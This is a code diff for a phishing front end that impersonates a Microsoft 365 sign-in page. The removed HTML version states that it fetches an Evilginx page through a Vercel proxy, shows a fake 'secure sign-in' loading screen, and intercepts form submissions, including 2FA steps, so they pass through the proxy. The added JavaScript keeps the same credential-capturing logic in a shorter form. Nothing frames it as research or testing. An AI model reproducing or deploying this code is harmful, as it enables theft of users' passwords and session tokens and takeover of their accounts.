@@ -1,46 +1,21 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading Microsoft 365...</title>
-    <script>
-        async function loadPage() {
-            try {
-                // Fetch Evilginx page through Vercel's proxy
-                const response = await fetch('/api/proxy');
-                const html = await response.text();
-                
-                // Show the page
-                document.open();
-                document.write(html);
-                document.close();
-                
-                // Hijack form submissions to keep them in proxy
-                document.querySelectorAll('form').forEach(form => {
-                    form.onsubmit = async (e) => {
-                        e.preventDefault();
-                        await fetch('/api/proxy', {
-                            method: 'POST',
-                            body: new FormData(form)
-                        });
-                        loadPage(); // Reload next page (e.g., 2FA)
-                    };
-                });
-            } catch {
-                window.location.href = "https://office.com"; // Fallback
-            }
-        }
-        
-        // Start loading
-        window.onload = () => {
-            document.body.innerHTML = `
-                <div style="text-align:center;margin-top:100px">
-                    <img src="https://www.microsoft.com/favicon.ico" width=50>
-                    <p>Loading your secure sign-in experience...</p>
-                </div>
-            `;
-            setTimeout(loadPage, 1000);
-        };
-    </script>
-</head>
-<body></body>
-</html>
+async function loadPage() {
+  const response = await fetch('/api/proxy');
+  const html = await response.text();
+  
+  // IMPORTANT: Use DOM parser to safely inject HTML
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(html, 'text/html');
+  document.body.innerHTML = doc.body.innerHTML;
+  
+  // Reattach form handlers
+  document.querySelectorAll('form').forEach(form => {
+    form.onsubmit = async (e) => {
+      e.preventDefault();
+      await fetch('/api/proxy', {
+        method: 'POST',
+        body: new FormData(form)
+      });
+      loadPage(); // Reload next page
+    };
+  });
+}
